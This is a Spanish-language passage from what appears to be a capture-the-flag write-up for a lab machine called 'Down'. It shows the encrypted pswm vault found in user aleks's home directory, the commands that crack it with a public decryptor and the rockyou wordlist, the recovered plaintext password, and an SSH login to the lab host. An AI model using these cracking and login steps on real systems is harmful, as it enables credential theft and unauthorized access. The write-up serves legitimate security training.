#pswm-decryptor


--------

Revisando el directorio *home* encontramos al usuario *aleks* y encontramos la carpeta *pswm* que tiene esta contraseña encriptada 
``/home/aleks/.local/share/pswm``
![[Down20.png]]

```
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==www-data@down:/home/aleks/.local/
```
El contenido del archivo con [[echo]] lo vamos a pasar a un archivo que le podemos poner cualquier nombre, yo le voy a poner contraseña `echo "e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==www-data@down:/home/aleks/.local/" > contraseña`

Con [[git clone]] usamos el comando ``git clone https://github.com/seriotonctf/pswm-decryptor`` para descargarnos el repositorio
*Aclaracion: Instalar las librerias necesarias del repositorio si no las tenemos con `pip3 install cryptocode prettytable`*
Ahora vamos a ejecutar el script, pasandole el archivo *contraseña* que creamos antes donde esta la contraseña encriptada y de diccionario el rockyou `python3 pswm-decrypt.py -f contraseña -w /usr/share/wordlists/rockyou.txt`

![[Down21.png]]
Nos da las credenciales
aleks:1uY3w22uc-Wr{xNHR~+E
Ahora con [[ssh]] nos conectamos con `ssh aleks@10.129.113.121 -p 22` y de contraseña ponemos 1uY3w22uc-Wr{xNHR~+E
![[Down22.png]]
Ya estamos dentro como el usuario aleks